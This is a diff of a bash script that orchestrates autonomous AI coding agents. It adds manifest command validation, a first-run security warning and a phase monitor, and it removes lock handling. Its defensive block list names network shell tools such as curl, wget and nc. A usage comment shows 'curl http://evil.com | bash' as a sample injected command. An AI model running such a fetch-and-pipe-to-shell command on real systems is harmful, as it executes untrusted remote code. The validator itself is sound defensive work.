@@ -18,12 +18,15 @@
 # FEATURES:
 #   - Modular phase-based execution (fresh context per phase)
 #   - Phase-specific prompts and timeouts
-#   - Automatic retry with exponential backoff
+#   - Verification gates with retry loops (IMPLEMENT, TEST, REVIEW)
 #   - Model fallback (opus -> sonnet on rate limits)
-#   - Parallel agent support via lock files
 #   - Self-healing and crash recovery
+#   - Single-shot execution: dk run "prompt"
 #
 set -euo pipefail
+
+# Secure file permissions: owner only (prevents world-readable logs/state)
+umask 0077
 
 # ============================================================================
 # Path Configuration (supports global installation)
@@ -47,8 +50,23 @@ source "$SCRIPT_DIR/skills.sh"
 # Source configuration library
 source "$SCRIPT_DIR/config.sh"
 
-# Source review tracker for periodic reviews
-source "$SCRIPT_DIR/review-tracker.sh"
+# Source approval system
+source "$SCRIPT_DIR/approval.sh"
+
+# Source progress display
+source "$SCRIPT_DIR/progress.sh"
+
+# Source circuit breaker
+source "$SCRIPT_DIR/circuit_breaker.sh"
+
+# Source rate limiter
+source "$SCRIPT_DIR/rate_limiter.sh"
+
+# Source exit detection
+source "$SCRIPT_DIR/exit_detection.sh"
+
+# Source audit logging
+source "$SCRIPT_DIR/audit.sh"
 
 # Project directory (set by CLI or auto-detected)
 PROJECT_DIR="${DOYAKEN_PROJECT:-$(pwd)}"
@@ -194,6 +212,55 @@ SAFE_ENV_PREFIXES=(
   "DEBUG_"        # Debug flags
 )
 
+# ============================================================================
+# Quality Command Security (for manifest loading)
+# ============================================================================
+
+# Safe command prefixes for quality gate commands (allowlist)
+# Commands must start with one of these to be considered safe
+SAFE_QUALITY_COMMANDS=(
+  # Node.js ecosystem
+  "npm" "yarn" "pnpm" "npx" "bun"
+  # Rust
+  "cargo"
+  # Go
+  "go"
+  # Build tools
+  "make"
+  # Python testing/linting
+  "pytest" "python" "ruff" "mypy" "black" "flake8" "pylint"
+  # JavaScript/TypeScript linting
+  "jest" "eslint" "tsc" "prettier" "vitest" "mocha"
+  # Shell
+  "shellcheck" "bats"
+  # Other languages
+  "node" "deno" "php" "composer" "ruby" "rake" "bundle"
+  "gradle" "mvn" "dotnet"
+)
+
+# Dangerous patterns that indicate potential command injection
+# These patterns in a quality command trigger a warning
+DANGEROUS_COMMAND_PATTERNS=(
+  '|'           # Pipe (command chaining)
+  '$('          # Command substitution
+  '`'           # Backtick command substitution
+  '&&'          # Command chaining (AND)
+  '||'          # Command chaining (OR) - can be legitimate for fallback
+  ';'           # Command separator
+  '>'           # Output redirection
+  '>>'          # Append redirection
+  '<'           # Input redirection
+  'curl '       # Network access
+  'wget '       # Network access
+  'nc '         # Netcat
+  'bash -c'     # Shell execution
+  'sh -c'       # Shell execution
+  'eval '       # Eval execution
+  '/dev/'       # Device access
+  '~/'          # Home directory access
+  '../'         # Parent directory traversal
+)
+
 # Validate if an environment variable name is safe to export
 # Returns 0 if safe, 1 if blocked
 is_safe_env_var() {
@@ -238,11 +305,145 @@ is_safe_env_var() {
   return 0
 }
 
+# Validate a quality gate command for safety
+# Returns:
+#   0 = safe (command is in allowlist, no dangerous patterns)
+#   1 = suspicious (unknown command or has dangerous patterns) - warn only
+#   2 = dangerous (blocked in strict mode) - block if DOYAKEN_STRICT_QUALITY=1
+#
+# Usage: validate_quality_command "npm test"
+#        validate_quality_command "curl http://evil.com | bash"
+validate_quality_command() {
+  local cmd="$1"
+  local cmd_name="${2:-quality command}"
+
+  # Empty commands are safe (noop)
+  [ -z "$cmd" ] && return 0
+
+  # Trim leading/trailing whitespace
+  cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
+  [ -z "$cmd" ] && return 0
+
+  # Extract the base command (first word, strip any path)
+  local base_cmd
+  base_cmd=$(echo "$cmd" | awk '{print $1}')
+  base_cmd=$(basename "$base_cmd")
+
+  # Check for dangerous patterns first (highest priority)
+  local has_dangerous=0
+  for pattern in "${DANGEROUS_COMMAND_PATTERNS[@]}"; do
+    if [[ "$cmd" == *"$pattern"* ]]; then
+      has_dangerous=1
+      break
+    fi
+  done
+
+  # Check if base command is in allowlist
+  local is_allowed=0
+  for safe_cmd in "${SAFE_QUALITY_COMMANDS[@]}"; do
+    if [ "$base_cmd" = "$safe_cmd" ]; then
+      is_allowed=1
+      break
+    fi
+  done
+
+  # Determine result based on checks
+  if [ "$has_dangerous" -eq 1 ]; then
+    # Dangerous pattern detected - return 2 (can be blocked in strict mode)
+    return 2
+  elif [ "$is_allowed" -eq 0 ]; then
+    # Unknown command - return 1 (warn only)
+    return 1
+  fi
+
+  # Safe command
+  return 0
+}
+
+# ============================================================================
+# First-Run Warning
+# ============================================================================
+
+# Check and display first-run warning about autonomous mode
+# Skip if: CI=true, non-interactive terminal, or already acknowledged
+check_first_run_warning() {
+  local ack_file="$DOYAKEN_HOME/.acknowledged"
+
+  # Skip in CI environments
+  if [ "${CI:-false}" = "true" ]; then
+    return 0
+  fi
+
+  # Skip in non-interactive terminals
+  if ! [ -t 0 ]; then
+    return 0
+  fi
+
+  # Skip if already acknowledged
+  if [ -f "$ack_file" ]; then
+    return 0
+  fi
+
+  # Display warning
+  echo ""
+  echo "╔════════════════════════════════════════════════════════════════════╗"
+  echo "║                     ⚠  SECURITY NOTICE  ⚠                         ║"
+  echo "╠════════════════════════════════════════════════════════════════════╣"
+  echo "║  Doyaken runs AI agents in FULLY AUTONOMOUS MODE by default.      ║"
+  echo "║                                                                    ║"
+  echo "║  Agents can:                                                       ║"
+  echo "║    • Execute arbitrary code without approval                       ║"
+  echo "║    • Modify any files in your project                              ║"
+  echo "║    • Access environment variables                                  ║"
+  echo "║    • Make network requests                                         ║"
+  echo "║                                                                    ║"
+  echo "║  Use --safe-mode to disable bypass flags and require confirmation. ║"
+  echo "║  See SECURITY.md for the full trust model.                         ║"
+  echo "╚════════════════════════════════════════════════════════════════════╝"
+  echo ""
+
+  # Prompt for acknowledgment
+  read -r -p "Type 'yes' to acknowledge and continue: " response
+
+  if [ "$response" = "yes" ]; then
+    # Create acknowledgment file
+    mkdir -p "$(dirname "$ack_file")"
+    echo "acknowledged=$(date -Iseconds 2>/dev/null || date)" > "$ack_file"
+    echo ""
+    echo "Acknowledgment recorded. This warning will not appear again."
+    echo ""
+    return 0
+  else
+    echo ""
+    echo "Autonomous mode not acknowledged. Exiting."
+    echo "Run with --safe-mode for interactive confirmation, or type 'yes' to continue."
+    exit 1
+  fi
+}
+
 # ============================================================================
 # Manifest Loading
 # ============================================================================
 
 MANIFEST_FILE="$DATA_DIR/manifest.yaml"
+
+# Global cache for manifest JSON (set by _load_manifest_json)
+MANIFEST_JSON=""
+
+# Load manifest as JSON for efficient parsing (single yq call)
+# Sets MANIFEST_JSON global variable
+_load_manifest_json() {
+  if [ -n "$MANIFEST_JSON" ]; then
+    return 0  # Already cached
+  fi
+  MANIFEST_JSON=$(yq -o=json '.' "$MANIFEST_FILE" 2>/dev/null) || MANIFEST_JSON="{}"
+}
+
+# Get value from cached manifest JSON
+# Usage: _jq_get '.agent.name' -> returns value or empty string
+_jq_get() {
+  echo "$MANIFEST_JSON" | jq -r "$1 // \"\"" 2>/dev/null || echo ""
+}
 
 # Load manifest settings (if yq is available)
 load_manifest() {
@@ -251,14 +452,27 @@ load_manifest() {
   fi
 
   if ! command -v yq &>/dev/null; then
-    # Fall back to basic grep-based parsing
+    echo -e "${YELLOW}[WARN]${NC} yq not installed - manifest.yaml settings will be ignored"
+    echo -e "${YELLOW}[WARN]${NC} Install: brew install yq (macOS) or apt install yq (Linux)"
     return 0
+  fi
+
+  # Check if jq is available for optimized loading
+  local use_json_cache=0
+  if command -v jq &>/dev/null; then
+    use_json_cache=1
+    _load_manifest_json
   fi
 
   # Load agent settings from manifest (only if not set via CLI/env)
   local manifest_agent manifest_model
-  manifest_agent=$(yq -e '.agent.name // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
-  manifest_model=$(yq -e '.agent.model // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
+  if [ "$use_json_cache" = "1" ]; then
+    manifest_agent=$(_jq_get '.agent.name')
+    manifest_model=$(_jq_get '.agent.model')
+  else
+    manifest_agent=$(yq -e '.agent.name // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
+    manifest_model=$(yq -e '.agent.model // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
+  fi
 
   # Only apply manifest values if not already set by CLI
   if [ -z "${DOYAKEN_AGENT_FROM_CLI:-}" ] && [ -n "$manifest_agent" ]; then
@@ -270,47 +484,138 @@ load_manifest() {
 
   # Load max retries
   local manifest_retries
-  manifest_retries=$(yq -e '.agent.max_retries // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
+  if [ "$use_json_cache" = "1" ]; then
+    manifest_retries=$(_jq_get '.agent.max_retries')
+  else
+    manifest_retries=$(yq -e '.agent.max_retries // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
+  fi
   if [ -n "$manifest_retries" ] && [ -z "${AGENT_MAX_RETRIES_FROM_CLI:-}" ]; then
     export AGENT_MAX_RETRIES="$manifest_retries"
   fi
 
-  # Load quality gate commands
-  export QUALITY_TEST_CMD=$(yq -e '.quality.test_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
-  export QUALITY_LINT_CMD=$(yq -e '.quality.lint_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
-  export QUALITY_FORMAT_CMD=$(yq -e '.quality.format_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
-  export QUALITY_BUILD_CMD=$(yq -e '.quality.build_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
+  # Load quality gate commands (with security validation)
+  local test_cmd lint_cmd format_cmd build_cmd
+  if [ "$use_json_cache" = "1" ]; then
+    test_cmd=$(_jq_get '.quality.test_command')
+    lint_cmd=$(_jq_get '.quality.lint_command')
+    format_cmd=$(_jq_get '.quality.format_command')
+    build_cmd=$(_jq_get '.quality.build_command')
+  else
+    test_cmd=$(yq -e '.quality.test_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
+    lint_cmd=$(yq -e '.quality.lint_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
+    format_cmd=$(yq -e '.quality.format_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
+    build_cmd=$(yq -e '.quality.build_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
+  fi
+
+  # Validate each quality command
+  local validation_result
+  local quality_cmds=("test_command:$test_cmd" "lint_command:$lint_cmd" "format_command:$format_cmd" "build_command:$build_cmd")
+  for cmd_entry in "${quality_cmds[@]}"; do
+    local cmd_name="${cmd_entry%%:*}"
+    local cmd_value="${cmd_entry#*:}"
+    [ -z "$cmd_value" ] && continue
+
+    validation_result=0
+    validate_quality_command "$cmd_value" "$cmd_name" || validation_result=$?
+
+    case $validation_result in
+      1)
+        # Unknown command - warn only
+        log_warn "Suspicious quality.$cmd_name: '$cmd_value' (unknown command prefix)"
+        ;;
+      2)
+        # Dangerous pattern detected
+        log_warn "Dangerous quality.$cmd_name: '$cmd_value' (contains dangerous pattern)"
+        if [ "${DOYAKEN_STRICT_QUALITY:-0}" = "1" ]; then
+          log_warn "Blocking quality.$cmd_name due to DOYAKEN_STRICT_QUALITY=1"
+          # Clear the dangerous command
+          case "$cmd_name" in
+            test_command) test_cmd="" ;;
+            lint_command) lint_cmd="" ;;
+            format_command) format_cmd="" ;;
+            build_command) build_cmd="" ;;
+          esac
+        fi
+        ;;
+    esac
+  done
+
+  export QUALITY_TEST_CMD="$test_cmd"
+  export QUALITY_LINT_CMD="$lint_cmd"
+  export QUALITY_FORMAT_CMD="$format_cmd"
+  export QUALITY_BUILD_CMD="$build_cmd"
 
   # Load custom environment variables from manifest (with security validation)
-  local env_keys
-  env_keys=$(yq -e '.env | keys | .[]' "$MANIFEST_FILE" 2>/dev/null || echo "")
-  if [ -n "$env_keys" ]; then
-    while IFS= read -r key; do
+  if [ "$use_json_cache" = "1" ]; then
+    # Optimized: extract all env vars as key=value pairs in single jq call
+    local env_pairs
+    env_pairs=$(echo "$MANIFEST_JSON" | jq -r '.env // {} | to_entries[] | "\(.key)=\(.value)"' 2>/dev/null) || env_pairs=""
+    while IFS='=' read -r key value; do
       [ -z "$key" ] && continue
       # Validate env var name before exporting
       if ! is_safe_env_var "$key"; then
         log_warn "Blocked unsafe env var from manifest: $key"
         continue
       fi
-      local value
-      value=$(yq -e ".env.${key}" "$MANIFEST_FILE" 2>/dev/null || echo "")
       if [ -n "$value" ]; then
         export "$key=$value"
       fi
-    done <<< "$env_keys"
+    done <<< "$env_pairs"
+  else
+    local env_keys
+    env_keys=$(yq -e '.env | keys | .[]' "$MANIFEST_FILE" 2>/dev/null || echo "")
+    if [ -n "$env_keys" ]; then
+      while IFS= read -r key; do
+        [ -z "$key" ] && continue
+        # Validate env var name before exporting
+        if ! is_safe_env_var "$key"; then
+          log_warn "Blocked unsafe env var from manifest: $key"
+          continue
+        fi
+        local value
+        value=$(yq -e ".env.${key}" "$MANIFEST_FILE" 2>/dev/null || echo "")
+        if [ -n "$value" ]; then
+          export "$key=$value"
+        fi
+      done <<< "$env_keys"
+    fi
   fi
 
   # Load skill hooks for all phases
   local phases="expand triage plan implement test docs review verify"
   local hook_types="before after"
-  for phase in $phases; do
-    for hook_type in $hook_types; do
-      local var_name="HOOKS_${hook_type^^}_${phase^^}"
-      local hook_value
-      hook_value=$(yq -e ".skills.hooks.${hook_type}-${phase} // [] | .[]" "$MANIFEST_FILE" 2>/dev/null | tr '\n' ' ' || echo "")
-      export "$var_name=$hook_value"
+  if [ "$use_json_cache" = "1" ]; then
+    # Optimized: extract all hooks in single jq call, iterate in bash
+    local hooks_json
+    hooks_json=$(echo "$MANIFEST_JSON" | jq -c '.skills.hooks // {}' 2>/dev/null) || hooks_json="{}"
+    for phase in $phases; do
+      for hook_type in $hook_types; do
+        local hook_type_upper phase_upper
+        hook_type_upper=$(echo "$hook_type" | tr '[:lower:]' '[:upper:]')
+        phase_upper=$(echo "$phase" | tr '[:lower:]' '[:upper:]')
+        local var_name="HOOKS_${hook_type_upper}_${phase_upper}"
+        local hook_key="${hook_type}-${phase}"
+        local hook_value
+        hook_value=$(echo "$hooks_json" | jq -r ".\"$hook_key\" // [] | .[]" 2>/dev/null | tr '\n' ' ') || hook_value=""
+        export "$var_name=$hook_value"
+      done
     done
-  done
+  else
+    for phase in $phases; do
+      for hook_type in $hook_types; do
+        local hook_type_upper phase_upper
+        hook_type_upper=$(echo "$hook_type" | tr '[:lower:]' '[:upper:]')
+        phase_upper=$(echo "$phase" | tr '[:lower:]' '[:upper:]')
+        local var_name="HOOKS_${hook_type_upper}_${phase_upper}"
+        local hook_value
+        hook_value=$(yq -e ".skills.hooks.${hook_type}-${phase} // [] | .[]" "$MANIFEST_FILE" 2>/dev/null | tr '\n' ' ' || echo "")
+        export "$var_name=$hook_value"
+      done
+    done
+  fi
+
+  # Clear the cache after loading to avoid stale data on next call
+  MANIFEST_JSON=""
 }
 
 # Run skill hooks for a phase
@@ -323,8 +628,8 @@ run_skill_hooks() {
   local hook_type_upper
   hook_type_upper=$(echo "$hook_type" | tr '[:lower:]' '[:upper:]')
   local hooks_var="HOOKS_${hook_type_upper}_${phase_name}"
-  local hooks=""
-  eval "hooks=\${$hooks_var:-}"
+  # Use indirect expansion instead of eval for safety
+  local hooks="${!hooks_var:-}"
 
   [ -z "$hooks" ] && return 0
 
@@ -345,11 +650,24 @@ load_manifest
 # This handles: timeouts, skip_phases, agent settings, output settings
 load_all_config "$MANIFEST_FILE"
 
+# Load display/progress configuration
+if declare -f load_display_config &>/dev/null; then
+  load_display_config "$MANIFEST_FILE"
+fi
+
+# Load circuit breaker configuration
+if declare -f load_circuit_breaker_config &>/dev/null; then
+  load_circuit_breaker_config "$MANIFEST_FILE"
+fi
+
+# Load rate limiter configuration
+if declare -f load_rate_limiter_config &>/dev/null; then
+  load_rate_limiter_config "$MANIFEST_FILE"
+fi
+
 # Project-specific directories
-TASKS_DIR="${TASKS_DIR:-$DATA_DIR/tasks}"
 LOGS_DIR="${LOGS_DIR:-$DATA_DIR/logs/claude-loop}"
 STATE_DIR="${STATE_DIR:-$DATA_DIR/state}"
-LOCKS_DIR="${LOCKS_DIR:-$DATA_DIR/locks}"
 
 # Detect operating manual (AGENT.md or CLAUDE.md for legacy)
 if [ -f "$PROJECT_DIR/AGENT.md" ]; then
@@ -363,8 +681,6 @@ fi
 # ============================================================================
 # Configuration Defaults
 # ============================================================================
-
-NUM_TASKS="${1:-5}"
 
 # Agent configuration
 DOYAKEN_AGENT="${DOYAKEN_AGENT:-claude}"
@@ -382,8 +698,8 @@ AGENT_PROGRESS="${AGENT_PROGRESS:-1}"
 AGENT_MAX_RETRIES="${AGENT_MAX_RETRIES:-2}"
 AGENT_RETRY_DELAY="${AGENT_RETRY_DELAY:-5}"
 AGENT_NO_RESUME="${AGENT_NO_RESUME:-0}"
-AGENT_LOCK_TIMEOUT="${AGENT_LOCK_TIMEOUT:-10800}"
-AGENT_HEARTBEAT="${AGENT_HEARTBEAT:-3600}"
+PHASE_MONITOR_INTERVAL="${PHASE_MONITOR_INTERVAL:-30}"
+PHASE_STALL_THRESHOLD="${PHASE_STALL_THRESHOLD:-180}"
 AGENT_NO_FALLBACK="${AGENT_NO_FALLBACK:-0}"
 
 # Phase skip flags and timeouts are loaded from config files via load_all_config()
@@ -403,11 +719,11 @@ SKIP_VERIFY="${SKIP_VERIFY:-0}"
 TIMEOUT_EXPAND="${TIMEOUT_EXPAND:-900}"
 TIMEOUT_TRIAGE="${TIMEOUT_TRIAGE:-540}"
 TIMEOUT_PLAN="${TIMEOUT_PLAN:-900}"
-TIMEOUT_IMPLEMENT="${TIMEOUT_IMPLEMENT:-5400}"
-TIMEOUT_TEST="${TIMEOUT_TEST:-1800}"
+TIMEOUT_IMPLEMENT="${TIMEOUT_IMPLEMENT:-7200}"
+TIMEOUT_TEST="${TIMEOUT_TEST:-3600}"
 TIMEOUT_DOCS="${TIMEOUT_DOCS:-900}"
 TIMEOUT_REVIEW="${TIMEOUT_REVIEW:-1800}"
-TIMEOUT_VERIFY="${TIMEOUT_VERIFY:-900}"
+TIMEOUT_VERIFY="${TIMEOUT_VERIFY:-1800}"
 
 # Phase definitions: name|prompt_file|timeout|skip_var
 PHASES=(
@@ -436,62 +752,27 @@ else
   DOYAKEN_PASSTHROUGH_ARGS=()
 fi
 
-# Generate unique agent ID with nicer default (atomic to prevent race conditions)
-if [ -z "${AGENT_NAME:-}" ]; then
-  # Ensure locks directory exists
-  mkdir -p "$LOCKS_DIR" 2>/dev/null || true
-
-  # Auto-generate worker name using atomic mkdir to prevent race conditions
-  WORKER_NUM=1
-  while true; do
-    WORKER_LOCK_DIR="$LOCKS_DIR/.worker-${WORKER_NUM}.active"
-    if mkdir "$WORKER_LOCK_DIR" 2>/dev/null; then
-      echo "$$" > "$WORKER_LOCK_DIR/pid"
-      break
-    fi
-    if [ -f "$WORKER_LOCK_DIR/pid" ]; then
-      OLD_PID=$(cat "$WORKER_LOCK_DIR/pid" 2>/dev/null || echo "0")
-      if [ "$OLD_PID" != "0" ] && ! kill -0 "$OLD_PID" 2>/dev/null; then
-        rm -rf "$WORKER_LOCK_DIR" 2>/dev/null || true
-        if mkdir "$WORKER_LOCK_DIR" 2>/dev/null; then
-          echo "$$" > "$WORKER_LOCK_DIR/pid"
-          break
-        fi
-      fi
-    fi
-    ((WORKER_NUM++))
-    if [ "$WORKER_NUM" -gt 100 ]; then
-      echo "ERROR: Could not find available worker number (max 100)" >&2
-      exit 1
-    fi
-  done
-  AGENT_NAME="worker-${WORKER_NUM}"
-fi
+# Agent identification
+AGENT_NAME="${AGENT_NAME:-doyaken}"
 AGENT_ID="${AGENT_NAME}"
-
-# Track locks held by this agent
-HELD_LOCKS=()
 
 # Track if this is an interrupt (Ctrl+C) vs normal exit
 INTERRUPTED=0
 
-# Colors
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[0;33m'
-BLUE='\033[0;34m'
-CYAN='\033[0;36m'
+# Source centralized logging for colors
+source "$SCRIPT_DIR/logging.sh"
+
+# Additional color for core
 MAGENTA='\033[0;35m'
-BOLD='\033[1m'
-NC='\033[0m'
 
 # ============================================================================
-# Logging
+# Logging (agent-specific with AGENT_ID prefix)
 # ============================================================================
 
 RUN_TIMESTAMP=$(date '+%Y%m%d-%H%M%S')
 RUN_LOG_DIR="$LOGS_DIR/$RUN_TIMESTAMP-$AGENT_ID"
 
+# Core uses AGENT_ID in prefix for multi-agent distinction
 log_info() {
   echo -e "${BLUE}[$AGENT_ID]${NC} $1"
 }
@@ -516,8 +797,12 @@ log_heal() {
   echo -e "${MAGENTA}[$AGENT_ID HEAL]${NC} $1"
 }
 
-log_lock() {
-  echo -e "${YELLOW}[$AGENT_ID LOCK]${NC} $1"
+log_monitor() {
+  echo -e "${DIM}[$AGENT_ID MONITOR]${NC} $1"
+}
+
+log_monitor_warn() {
+  echo -e "${YELLOW}[$AGENT_ID MONITOR]${NC} $1"
 }
 
 log_model() {
@@ -541,6 +826,7 @@ log_header() {
 # ============================================================================
 
 progress_filter() {
+  trap "exit 130" INT TERM
   local phase_name="$1"
   local last_tool=""
   local line_count=0
@@ -555,39 +841,77 @@ progress_filter() {
   }
 
   while IFS= read -r line; do
-    ((line_count++))
+    ((++line_count))
+
+    # Show "connected" on very first line received from agent
+    if [ "$line_count" -eq 1 ]; then
+      show_status "⋯ connected, processing..."
+    fi
 
     if command -v jq &>/dev/null; then
-      local msg_type tool_name content
+      local msg_type
       msg_type=$(echo "$line" | jq -r '.type // empty' 2>/dev/null)
 
       case "$msg_type" in
         "assistant")
-          content=$(echo "$line" | jq -r '.message.content[0].text // empty' 2>/dev/null | head -c 160)
-          if [ -n "$content" ]; then
-            show_status "💭 ${content}..."
-          fi
-          ;;
-        "content_block_start")
-          local block_type
-          block_type=$(echo "$line" | jq -r '.content_block.type // empty' 2>/dev/null)
-          if [ "$block_type" = "tool_use" ]; then
-            tool_name=$(echo "$line" | jq -r '.content_block.name // empty' 2>/dev/null)
-            if [ -n "$tool_name" ] && [ "$tool_name" != "$last_tool" ]; then
-              last_tool="$tool_name"
-              show_status "🔧 $tool_name"
+          # Extract tool calls with context (file name, pattern, command desc)
+          local tool_detail
+          tool_detail=$(echo "$line" | jq -r '
+            [.message.content[] | select(.type == "tool_use") |
+              .name + (
+                if .name == "Read" or .name == "Edit" or .name == "Write" then
+                  " " + (.input.file_path // "" | split("/") | last)
+                elif .name == "Glob" then " " + (.input.pattern // "")
+                elif .name == "Grep" then " \"" + ((.input.pattern // "")[:40]) + "\""
+                elif .name == "Bash" then " " + ((.input.description // .input.command // "")[:50])
+                elif .name == "Task" then " " + ((.input.description // "")[:40])
+                else ""
+                end
+              )
+            ] | join("  →  ")' 2>/dev/null)
+          if [ -n "$tool_detail" ]; then
+            show_status "🔧 $tool_detail"
+            last_tool="$tool_detail"
+          else
+            # No tools - show text content (thinking)
+            local content
+            content=$(echo "$line" | jq -r '
+              [.message.content[] | select(.type == "text") | .text] |
+              join("") | gsub("\n"; " ") | .[:120]' 2>/dev/null)
+            if [ -n "$content" ]; then
+              show_status "💭 ${content}"
             fi
           fi
           ;;
+        "user")
+          # Tool results - show brief stdout summary
+          local tool_stdout
+          tool_stdout=$(echo "$line" | jq -r '
+            if .tool_use_result.stdout then
+              .tool_use_result.stdout | gsub("\n"; " ") | .[:80]
+            else empty end' 2>/dev/null)
+          if [ -n "$tool_stdout" ]; then
+            show_status "📎 ${tool_stdout}"
+          fi
+          ;;
         "result")
-          local subtype cost_usd
+          local subtype cost_usd duration_ms num_turns
           subtype=$(echo "$line" | jq -r '.subtype // empty' 2>/dev/null)
           cost_usd=$(echo "$line" | jq -r '.cost_usd // empty' 2>/dev/null)
+          duration_ms=$(echo "$line" | jq -r '.duration_ms // empty' 2>/dev/null)
+          num_turns=$(echo "$line" | jq -r '.num_turns // empty' 2>/dev/null)
           if [ "$subtype" = "success" ]; then
-            show_status "✓ Done"
-          elif [ -n "$cost_usd" ]; then
-            show_status "💰 \$$cost_usd"
+            local duration_s=""
+            [ -n "$duration_ms" ] && duration_s="$(( duration_ms / 1000 ))s"
+            show_status "✅ Done (${num_turns:-?} turns, ${duration_s:-?}, \$${cost_usd:-?})"
+          else
+            show_status "❌ Failed: $subtype (\$${cost_usd:-?})"
           fi
+          ;;
+        "system")
+          local model
+          model=$(echo "$line" | jq -r '.model // empty' 2>/dev/null)
+          show_status "⋯ session started${model:+ ($model)}"
           ;;
         *)
           if [ $((line_count % 10)) -eq 0 ]; then
@@ -596,6 +920,7 @@ progress_filter() {
           ;;
       esac
     else
+      # Fallback without jq
       if echo "$line" | grep -q '"tool_use"'; then
         local tool
         tool=$(echo "$line" | grep -oE '"name":"[^"]+"' | head -1 | cut -d'"' -f4)
@@ -603,276 +928,115 @@ progress_filter() {
           last_tool="$tool"
           show_status "🔧 $tool"
         fi
-      elif echo "$line" | grep -q '"result"'; then
-        show_status "✓ Done"
-      elif [ $((line_count % 10)) -eq 0 ]; then
+      elif echo "$line" | grep -q '"type":"result"'; then
+        show_status "✅ Done"
+      elif [ $((line_count % 5)) -eq 0 ]; then
         show_status "⋯ working"
       fi
     fi
   done
 }
 
-# ============================================================================
-# Lock Management (Parallel Agent Support)
-# ============================================================================
-
-init_locks() {
-  mkdir -p "$LOCKS_DIR"
-}
-
-get_task_id_from_file() {
-  local file="$1"
-  basename "$file" .md
-}
-
-get_lock_file() {
-  local task_id="$1"
-  echo "$LOCKS_DIR/${task_id}.lock"
-}
-
-is_lock_stale() {
-  local lock_file="$1"
-
-  if [ ! -f "$lock_file" ]; then
-    return 0
-  fi
-
-  local locked_at pid
-  locked_at=$(grep "^LOCKED_AT=" "$lock_file" 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "0")
-  pid=$(grep "^PID=" "$lock_file" 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "0")
-
-  if [ -n "$pid" ] && [ "$pid" != "0" ]; then
-    if ! kill -0 "$pid" 2>/dev/null; then
-      log_heal "Lock PID $pid is not running - lock is stale"
-      return 0
-    fi
-  fi
-
-  local now locked_timestamp age
-  now=$(date +%s)
-  locked_timestamp=$(date -j -f "%Y-%m-%d %H:%M:%S" "$locked_at" +%s 2>/dev/null || date -d "$locked_at" +%s 2>/dev/null || echo "0")
-
-  if [ "$locked_timestamp" != "0" ]; then
-    age=$((now - locked_timestamp))
-    if [ "$age" -gt "$AGENT_LOCK_TIMEOUT" ]; then
-      log_heal "Lock is ${age}s old (> ${AGENT_LOCK_TIMEOUT}s) - lock is stale"
-      return 0
-    fi
-  fi
-
-  return 1
-}
-
-is_task_locked() {
-  local task_id="$1"
-  local lock_file
-  lock_file=$(get_lock_file "$task_id")
-
-  if [ ! -f "$lock_file" ]; then
-    return 1
-  fi
-
-  local lock_agent
-  lock_agent=$(grep "^AGENT_ID=" "$lock_file" 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "")
-
-  if [ "$lock_agent" = "$AGENT_ID" ]; then
-    return 1
-  fi
-
-  if is_lock_stale "$lock_file"; then
-    log_heal "Removing stale lock for $task_id"
-    rm -f "$lock_file"
-    return 1
-  fi
-
-  return 0
-}
-
-acquire_lock() {
-  local task_id="$1"
-  local lock_file
-  lock_file=$(get_lock_file "$task_id")
-
-  local lock_dir="${lock_file}.acquiring"
-
-  if ! mkdir "$lock_dir" 2>/dev/null; then
-    sleep 0.5
-    if [ -d "$lock_dir" ]; then
-      log_warn "Lock acquisition in progress by another agent for $task_id"
-      return 1
-    fi
-  fi
-
-  if [ -f "$lock_file" ]; then
-    local lock_agent
-    lock_agent=$(grep "^AGENT_ID=" "$lock_file" 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "")
-
-    if [ "$lock_agent" != "$AGENT_ID" ] && ! is_lock_stale "$lock_file"; then
-      rmdir "$lock_dir" 2>/dev/null || true
-      return 1
-    fi
-  fi
-
-  cat > "$lock_file" << EOF
-AGENT_ID="$AGENT_ID"
-LOCKED_AT="$(date '+%Y-%m-%d %H:%M:%S')"
-PID="$$"
-TASK_ID="$task_id"
-EOF
-
-  rmdir "$lock_dir" 2>/dev/null || true
-
-  HELD_LOCKS+=("$task_id")
-  log_lock "Acquired lock for $task_id"
-
-  return 0
-}
-
-release_lock() {
-  local task_id="$1"
-  local lock_file
-  lock_file=$(get_lock_file "$task_id")
-
-  if [ -f "$lock_file" ]; then
-    local lock_agent
-    lock_agent=$(grep "^AGENT_ID=" "$lock_file" 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "")
-
-    if [ "$lock_agent" = "$AGENT_ID" ]; then
-      rm -f "$lock_file"
-      log_lock "Released lock for $task_id"
-
-      local new_held=()
-      for held in "${HELD_LOCKS[@]}"; do
-        if [ "$held" != "$task_id" ]; then
-          new_held+=("$held")
-        fi
-      done
-      HELD_LOCKS=("${new_held[@]+"${new_held[@]}"}")
-    fi
-  fi
-}
-
-release_all_locks() {
-  log_lock "Releasing all held locks..."
-  for task_id in "${HELD_LOCKS[@]+"${HELD_LOCKS[@]}"}"; do
-    release_lock "$task_id"
-  done
-  HELD_LOCKS=()
-}
 
 # ============================================================================
-# Task File Git Operations
+# Phase Monitor (Active Health Checking)
 # ============================================================================
+# Monitors agent output during phase execution to detect stuck/hung agents.
+# Checks log file growth at regular intervals and warns when no output is
+# produced for too long.
 
-commit_task_files() {
-  local message="$1"
-  local task_id="${2:-}"
+PHASE_MONITOR_PID=""
 
-  git add "$TASKS_DIR" TASKBOARD.md 2>/dev/null || true
+start_phase_monitor() {
+  local phase_name="$1"
+  local phase_log="$2"
+  local timeout="$3"
 
-  if git diff --cached --quiet 2>/dev/null; then
